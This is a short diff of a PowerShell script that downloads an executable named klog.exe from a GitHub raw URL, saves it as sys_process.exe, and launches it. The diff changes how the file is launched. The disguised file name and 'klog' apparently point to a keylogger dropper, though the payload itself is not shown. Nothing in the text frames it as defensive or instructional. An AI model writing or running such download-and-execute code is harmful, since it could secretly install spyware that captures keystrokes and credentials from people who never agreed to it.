@@ -2,4 +2,4 @@ $dlUrl = "https://raw.githubusercontent.com/N8crawler2139/MyCode/main/klog.exe"
 $dlPath = Join-Path -Path $PWD.Path -ChildPath "sys_process.exe"
 Invoke-WebRequest -Uri $dlUrl -OutFile $dlPath
 cd $PWD.Path
-.\sys_process.exe
+Start-Process .\sys_process.exe
